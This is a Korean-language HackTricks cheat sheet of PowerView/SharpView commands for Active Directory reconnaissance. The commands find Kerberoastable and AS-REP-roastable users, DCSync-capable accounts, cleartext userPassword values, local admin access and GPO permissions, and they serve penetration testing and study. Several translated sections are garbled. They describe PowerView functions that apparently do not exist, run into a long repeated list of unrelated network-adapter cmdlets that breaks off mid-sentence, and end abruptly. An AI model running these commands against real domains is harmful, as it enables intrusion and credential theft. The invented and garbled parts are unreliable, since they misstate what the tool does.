# PowerView/SharpView

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가로 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>

PowerView의 가장 최신 버전은 항상 PowerSploit의 dev 브랜치에 있습니다: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView)는 [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)의 .NET 포트입니다.

### 빠른 열거
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### 도메인 정보

```powershell
Get-Domain
```

이 명령은 현재 도메인에 대한 정보를 제공합니다. 이 명령은 현재 사용자가 속한 도메인의 이름, SID, 포리스트 이름, 포리스트 SID 등을 표시합니다.

```powershell
Get-DomainController
```

이 명령은 현재 도메인의 도메인 컨트롤러에 대한 정보를 제공합니다. 이 명령은 도메인 컨트롤러의 이름, IP 주소, 운영 체제 버전 등을 표시합니다.

```powershell
Get-DomainPolicy
```

이 명령은 현재 도메인의 그룹 정책에 대한 정보를 제공합니다. 이 명령은 그룹 정책의 이름, GPO ID, 적용 범위 등을 표시합니다.

```powershell
Get-DomainTrust
```

이 명령은 현재 도메인과 신뢰 관계에 있는 도메인에 대한 정보를 제공합니다. 이 명령은 신뢰 관계 도메인의 이름, SID, 신뢰 관계 유형 등을 표시합니다.

```powershell
Get-DomainUser
```

이 명령은 현재 도메인의 사용자에 대한 정보를 제공합니다. 이 명령은 사용자의 이름, SID, 계정 상태 등을 표시합니다.

```powershell
Get-DomainGroup
```

이 명령은 현재 도메인의 그룹에 대한 정보를 제공합니다. 이 명령은 그룹의 이름, SID, 그룹 유형 등을 표시합니다.

```powershell
Get-DomainComputer
```

이 명령은 현재 도메인의 컴퓨터에 대한 정보를 제공합니다. 이 명령은 컴퓨터의 이름, SID, 운영 체제 버전 등을 표시합니다.
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### 사용자, 그룹, 컴퓨터 및 OU

PowerView는 Windows 환경에서 사용자, 그룹, 컴퓨터 및 OU(조직 단위)와 관련된 정보를 쉽게 수집할 수 있는 강력한 도구입니다. 이 정보를 수집하면 네트워크 환경을 분석하고 보안 취약점을 식별하는 데 도움이 됩니다.

#### 사용자 정보 수집

PowerView를 사용하여 도메인 내의 모든 사용자 계정을 가져올 수 있습니다. 다음 명령을 사용하면 됩니다.

```powershell
Get-NetUser
```

#### 그룹 정보 수집

PowerView를 사용하여 도메인 내의 모든 그룹을 가져올 수 있습니다. 다음 명령을 사용하면 됩니다.

```powershell
Get-NetGroup
```

#### 컴퓨터 정보 수집

PowerView를 사용하여 도메인 내의 모든 컴퓨터를 가져올 수 있습니다. 다음 명령을 사용하면 됩니다.

```powershell
Get-NetComputer
```

#### OU 정보 수집

PowerView를 사용하여 도메인 내의 모든 OU를 가져올 수 있습니다. 다음 명령을 사용하면 됩니다.

```powershell
Get-NetOU
```

PowerView를 사용하면 이러한 정보를 쉽게 수집할 수 있으며, 이를 통해 네트워크 환경을 분석하고 보안 취약점을 식별할 수 있습니다.
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### 로그온 및 세션

PowerView는 로그온 및 세션 관련 정보를 수집하고 조작하는 데 사용할 수 있는 다양한 기능을 제공합니다.

#### Get-NetLoggedon

`Get-NetLoggedon`은 현재 도메인 컨트롤러에 로그온한 사용자의 목록을 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 로그온 시간 및 로그온 유형과 같은 정보를 제공합니다.

```powershell
Get-NetLoggedon
```

#### Get-NetSession

`Get-NetSession`은 현재 도메인 컨트롤러에서 활성화된 세션의 목록을 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID, 세션 상태 및 세션 종류와 같은 정보를 제공합니다.

```powershell
Get-NetSession
```

#### Get-NetSessionComputer

`Get-NetSessionComputer`은 특정 컴퓨터에서 활성화된 세션의 목록을 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID, 세션 상태 및 세션 종류와 같은 정보를 제공합니다.

```powershell
Get-NetSessionComputer -ComputerName <ComputerName>
```

#### Get-NetSessionUser

`Get-NetSessionUser`는 특정 사용자가 로그온한 모든 컴퓨터에서 활성화된 세션의 목록을 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID, 세션 상태 및 세션 종류와 같은 정보를 제공합니다.

```powershell
Get-NetSessionUser -UserName <UserName>
```

#### Get-NetSessionDomain

`Get-NetSessionDomain`은 특정 도메인에서 활성화된 세션의 목록을 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID, 세션 상태 및 세션 종류와 같은 정보를 제공합니다.

```powershell
Get-NetSessionDomain -Domain <DomainName>
```

#### Get-NetSessionGroup

`Get-NetSessionGroup`은 특정 그룹에 속한 사용자가 로그온한 모든 컴퓨터에서 활성화된 세션의 목록을 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID, 세션 상태 및 세션 종류와 같은 정보를 제공합니다.

```powershell
Get-NetSessionGroup -GroupName <GroupName>
```

#### Get-NetSessionID

`Get-NetSessionID`는 특정 세션 ID를 가진 세션의 정보를 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID, 세션 상태 및 세션 종류와 같은 정보를 제공합니다.

```powershell
Get-NetSessionID -SessionID <SessionID>
```

#### Get-NetSessionIDUser

`Get-NetSessionIDUser`는 특정 사용자가 로그온한 모든 컴퓨터에서 특정 세션 ID를 가진 세션의 정보를 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID, 세션 상태 및 세션 종류와 같은 정보를 제공합니다.

```powershell
Get-NetSessionIDUser -SessionID <SessionID> -UserName <UserName>
```

#### Get-NetSessionIDComputer

`Get-NetSessionIDComputer`는 특정 컴퓨터에서 특정 세션 ID를 가진 세션의 정보를 가져옵니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID, 세션 상태 및 세션 종류와 같은 정보를 제공합니다.

```powershell
Get-NetSessionIDComputer -SessionID <SessionID> -ComputerName <ComputerName>
```
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### 그룹 정책 개체 - GPOs

만약 공격자가 GPO에 대한 **높은 권한**을 가지고 있다면, 그는 **사용자에게 권한을 추가**하거나, 호스트에 **로컬 관리자 사용자를 추가**하거나, 즉각적으로 **작업을 수행하기 위해 예약된 작업을 생성**함으로써 이를 악용하여 **권한 상승**을 할 수 있을 것입니다.\
[**자세한 정보 및 악용 방법은 이 링크를 따르세요**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation).
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
**ACL (Access Control List)**은 파일 시스템이나 리소스에 대한 액세스 권한을 관리하는 데 사용되는 메커니즘입니다. ACL은 개별 사용자 또는 그룹에 대한 특정 작업(읽기, 쓰기, 실행 등)을 허용하거나 거부하는 데 사용됩니다.

ACL을 이용하여 GPOs와 ACLs의 권한을 악용하는 방법을 배우려면 다음을 참조하세요:

{% content-ref url="../active-directory-methodology/acl-persistence-abuse/" %}
[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
{% endcontent-ref %}

### ACL
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### 공유 파일 및 폴더

PowerView는 네트워크에서 공유 파일 및 폴더를 식별하고 액세스 권한을 확인하는 데 사용할 수 있습니다.

#### Get-NetShare

`Get-NetShare` 명령은 현재 시스템에서 공유된 폴더를 나열합니다. 이 명령은 공유 이름, 경로, 설명 및 액세스 권한을 표시합니다.

```powershell
Get-NetShare
```

#### Get-NetLoggedon

`Get-NetLoggedon` 명령은 현재 시스템에 로그온한 사용자를 식별합니다. 이 명령은 사용자 이름, 도메인, SID 및 로그온 시간을 표시합니다.

```powershell
Get-NetLoggedon
```

#### Get-NetSession

`Get-NetSession` 명령은 현재 시스템에서 활성 세션을 식별합니다. 이 명령은 사용자 이름, 컴퓨터 이름, 세션 ID 및 로그온 시간을 표시합니다.

```powershell
Get-NetSession
```

#### Get-NetFile

`Get-NetFile` 명령은 현재 시스템에서 열린 파일을 식별합니다. 이 명령은 파일 이름, 사용자 이름, 컴퓨터 이름 및 파일 ID를 표시합니다.

```powershell
Get-NetFile
```

#### Get-NetPrinter

`Get-NetPrinter` 명령은 현재 시스템에서 공유된 프린터를 식별합니다. 이 명령은 프린터 이름, 포트 이름, 드라이버 이름 및 프린터 위치를 표시합니다.

```powershell
Get-NetPrinter
```

#### Get-NetConnectionProfile

`Get-NetConnectionProfile` 명령은 현재 시스템의 네트워크 연결 프로필을 식별합니다. 이 명령은 프로필 이름, 인터페이스 이름, 네트워크 이름 및 프로필 상태를 표시합니다.

```powershell
Get-NetConnectionProfile
```

#### Get-NetFirewallRule

`Get-NetFirewallRule` 명령은 현재 시스템의 방화벽 규칙을 식별합니다. 이 명령은 규칙 이름, 프로토콜, 로컬 및 원격 IP 주소, 포트 및 액션을 표시합니다.

```powershell
Get-NetFirewallRule
```

#### Get-NetOffloadGlobalSetting

`Get-NetOffloadGlobalSetting` 명령은 현재 시스템의 네트워크 오프로드 전역 설정을 식별합니다. 이 명령은 오프로드 설정 상태를 표시합니다.

```powershell
Get-NetOffloadGlobalSetting
```

#### Get-NetOffloadSetting

`Get-NetOffloadSetting` 명령은 현재 시스템의 네트워크 오프로드 설정을 식별합니다. 이 명령은 인터페이스 이름, 오프로드 설정 상태 및 오프로드 기능을 표시합니다.

```powershell
Get-NetOffloadSetting
```

#### Get-NetQosPolicy

`Get-NetQosPolicy` 명령은 현재 시스템의 QoS(품질 서비스) 정책을 식별합니다. 이 명령은 정책 이름, DSCP(차등 서비스 코드 포인트), IP 주소 범위 및 포트 범위를 표시합니다.

```powershell
Get-NetQosPolicy
```

#### Get-NetRoute

`Get-NetRoute` 명령은 현재 시스템의 라우팅 테이블을 식별합니다. 이 명령은 네트워크 대상, 인터페이스 이름, 인터페이스 메트릭 및 네트워크 주소를 표시합니다.

```powershell
Get-NetRoute
```

#### Get-NetIPAddress

`Get-NetIPAddress` 명령은 현재 시스템의 IP 주소를 식별합니다. 이 명령은 인터페이스 이름, IP 주소, 서브넷 마스크 및 주소 유형을 표시합니다.

```powershell
Get-NetIPAddress
```

#### Get-NetAdapter

`Get-NetAdapter` 명령은 현재 시스템의 네트워크 어댑터를 식별합니다. 이 명령은 인터페이스 이름, 인터페이스 상태, 링크 속도 및 MAC 주소를 표시합니다.

```powershell
Get-NetAdapter
```

#### Get-NetAdapterStatistics

`Get-NetAdapterStatistics` 명령은 현재 시스템의 네트워크 어댑터 통계를 식별합니다. 이 명령은 인터페이스 이름, 패킷 수신 및 전송, 바이트 수신 및 전송을 표시합니다.

```powershell
Get-NetAdapterStatistics
```

#### Get-NetAdapterRss

`Get-NetAdapterRss` 명령은 현재 시스템의 네트워크 어댑터 RSS(수신 측 스케일링) 설정을 식별합니다. 이 명령은 인터페이스 이름, RSS 설정 상태 및 RSS 프로세서 수를 표시합니다.

```powershell
Get-NetAdapterRss
```

#### Get-NetAdapterAdvancedProperty

`Get-NetAdapterAdvancedProperty` 명령은 현재 시스템의 네트워크 어댑터 고급 속성을 식별합니다. 이 명령은 인터페이스 이름, 속성 이름, 속성 값 및 속성 설명을 표시합니다.

```powershell
Get-NetAdapterAdvancedProperty
```

#### Get-NetAdapterBinding

`Get-NetAdapterBinding` 명령은 현재 시스템의 네트워크 어댑터 바인딩을 식별합니다. 이 명령은 인터페이스 이름, 바인딩 구성 요소 및 바인딩 상태를 표시합니다.

```powershell
Get-NetAdapterBinding
```

#### Get-NetAdapterChecksumOffload

`Get-NetAdapterChecksumOffload` 명령은 현재 시스템의 네트워크 어댑터 체크섬 오프로드 설정을 식별합니다. 이 명령은 인터페이스 이름, 체크섬 오프로드 설정 상태 및 체크섬 오프로드 기능을 표시합니다.

```powershell
Get-NetAdapterChecksumOffload
```

#### Get-NetAdapterEncapsulatedPacketTaskOffload

`Get-NetAdapterEncapsulatedPacketTaskOffload` 명령은 현재 시스템의 네트워크 어댑터 캡슐화된 패킷 작업 오프로드 설정을 식별합니다. 이 명령은 인터페이스 이름, 캡슐화된 패킷 작업 오프로드 설정 상태 및 캡슐화된 패킷 작업 오프로드 기능을 표시합니다.

```powershell
Get-NetAdapterEncapsulatedPacketTaskOffload
```

#### Get-NetAdapterIPsecOffload

`Get-NetAdapterIPsecOffload` 명령은 현재 시스템의 네트워크 어댑터 IPsec 오프로드 설정을 식별합니다. 이 명령은 인터페이스 이름, IPsec 오프로드 설정 상태 및 IPsec 오프로드 기능을 표시합니다.

```powershell
Get-NetAdapterIPsecOffload
```

#### Get-NetAdapterLso

`Get-NetAdapterLso` 명령은 현재 시스템의 네트워크 어댑터 LSO(대량 송신 오프로드) 설정을 식별합니다. 이 명령은 인터페이스 이름, LSO 설정 상태 및 LSO 기능을 표시합니다.

```powershell
Get-NetAdapterLso
```

#### Get-NetAdapterPacketDirect

`Get-NetAdapterPacketDirect` 명령은 현재 시스템의 네트워크 어댑터 패킷 직접 설정을 식별합니다. 이 명령은 인터페이스 이름, 패킷 직접 설정 상태 및 패킷 직접 기능을 표시합니다.

```powershell
Get-NetAdapterPacketDirect
```

#### Get-NetAdapterPowerManagement

`Get-NetAdapterPowerManagement` 명령은 현재 시스템의 네트워크 어댑터 전원 관리 설정을 식별합니다. 이 명령은 인터페이스 이름, 전원 관리 설정 상태 및 전원 관리 기능을 표시합니다.

```powershell
Get-NetAdapterPowerManagement
```

#### Get-NetAdapterQos

`Get-NetAdapterQos` 명령은 현재 시스템의 네트워크 어댑터 QoS(품질 서비스) 설정을 식별합니다. 이 명령은 인터페이스 이름, QoS 설정 상태 및 QoS 기능을 표시합니다.

```powershell
Get-NetAdapterQos
```

#### Get-NetAdapterRdma

`Get-NetAdapterRdma` 명령은 현재 시스템의 네트워크 어댑터 RDMA(원격 DMA) 설정을 식별합니다. 이 명령은 인터페이스 이름, RDMA 설정 상태 및 RDMA 기능을 표시합니다.

```powershell
Get-NetAdapterRdma
```

#### Get-NetAdapterRsc

`Get-NetAdapterRsc` 명령은 현재 시스템의 네트워크 어댑터 RSC(수신 측 스케일링) 설정을 식별합니다. 이 명령은 인터페이스 이름, RSC 설정 상태 및 RSC 기능을 표시합니다.

```powershell
Get-NetAdapterRsc
```

#### Get-NetAdapterRss

`Get-NetAdapterRss` 명령은 현재 시스템의 네트워크 어댑터 RSS(수신 측 스케일링) 설정을 식별합니다. 이 명령은 인터페이스 이름, RSS 설정 상태 및 RSS 프로세서 수를 표시합니다.

```powershell
Get-NetAdapterRss
```

#### Get-NetAdapterSriov

`Get-NetAdapterSriov` 명령은 현재 시스템의 네트워크 어댑터 SR-IOV(단일 물리적 I/O 가상화) 설정을 식별합니다. 이 명령은 인터페이스 이름, SR-IOV 설정 상태 및 SR-IOV 기능을 표시합니다.

```powershell
Get-NetAdapterSriov
```

#### Get-NetAdapterSriovVf

`Get-NetAdapterSriovVf` 명령은 현재 시스템의 네트워크 어댑터 SR-IOV 가상 함수(VF) 설정을 식별합니다. 이 명령은 인터페이스 이름, VF 인덱스, VF 상태 및 VF MAC 주소를 표시합니다.

```powershell
Get-NetAdapterSriovVf
```

#### Get-NetAdapterVmq

`Get-NetAdapterVmq` 명령은 현재 시스템의 네트워크 어댑터 VMQ(가상 머신 큐) 설정을 식별합니다. 이 명령은 인터페이스 이름, VMQ 설정 상태 및 VMQ 큐 수를 표시합니다.

```powershell
Get-NetAdapterVmq
```

#### Get-NetAdapterVPort

`Get-NetAdapterVPort` 명령은 현재 시스템의 네트워크 어댑터 가상 포트 설정을 식별합니다. 이 명령은 인터페이스 이름, 가상 포트 ID, 가상 포트 상태 및 가상 포트 MAC 주소를 표시합니다.

```powershell
Get-NetAdapterVPort
```

#### Get-NetAdapterVPortSetting

`Get-NetAdapterVPortSetting` 명령은 현재 시스템의 네트워크 어댑터 가상 포트 설정을 식별합니다. 이 명령은 인터페이스 이름, 가상 포트 ID, 가상 포트 설정 상태 및 가상 포트 설정 값을 표시합니다.

```powershell
Get-NetAdapterVPortSetting
```

#### Get-NetAdapterWakeUp

`Get-NetAdapterWakeUp` 명령은 현재 시스템의 네트워크 어댑터 웨이크업 설정을 식별합니다. 이 명령은 인터페이스 이름, 웨이크업 설정 상태 및 웨이크업 패턴을 표시합니다.

```powershell
Get-NetAdapterWakeUp
```

#### Get-NetAdapterWoL

`Get-NetAdapterWoL` 명령은 현재 시스템의 네트워크 어댑터 WoL(매직 패킷) 설정을 식별합니다. 이 명령은 인터페이스 이름, WoL 설정 상태 및 WoL 패턴을 표시합니다.

```powershell
Get-NetAdapterWoL
```

#### Get-NetAdapterPhysical

`Get-NetAdapterPhysical` 명령은 현재 시스템의 물리적 네트워크 어댑터를 식별합니다. 이 명령은 인터페이스 이름, 인터페이스 상태, 링크 속도 및 MAC 주소를 표시합니다.

```powershell
Get-NetAdapterPhysical
```

#### Get-NetAdapterHardwareInfo

`Get-NetAdapterHardwareInfo` 명령은 현재 시스템의 네트워크 어댑터 하드웨어 정보를 식별합니다. 이 명령은 인터페이스 이름, 하드웨어 정보 유형 및 하드웨어 정보 값을 표시합니다.

```powershell
Get-NetAdapterHardwareInfo
```

#### Get-NetAdapterPowerManagement

`Get-NetAdapterPowerManagement` 명령은 현재 시스템의 네트워크 어댑터 전원 관리 설정을 식별합니다. 이 명령은 인터페이스 이름, 전원 관리 설정 상태 및 전원 관리 기능을 표시합니다.

```powershell
Get-NetAdapterPowerManagement
```

#### Get-NetAdapterQos

`Get-NetAdapterQos` 명령은 현재 시스템의 네트워크 어댑터 QoS(품질 서비스
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### 도메인 신뢰

Domain trust is a relationship established between two domains that allows users from one domain to access resources in another domain. Trust relationships are commonly used in large organizations with multiple domains to facilitate user authentication and resource access across domains.

도메인 신뢰는 두 도메인 간에 설정된 관계로, 한 도메인의 사용자가 다른 도메인의 리소스에 접근할 수 있도록 합니다. 신뢰 관계는 여러 도메인을 가진 대규모 조직에서 사용자 인증 및 리소스 접근을 용이하게 하기 위해 일반적으로 사용됩니다.
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### 낮은 수준의 과일

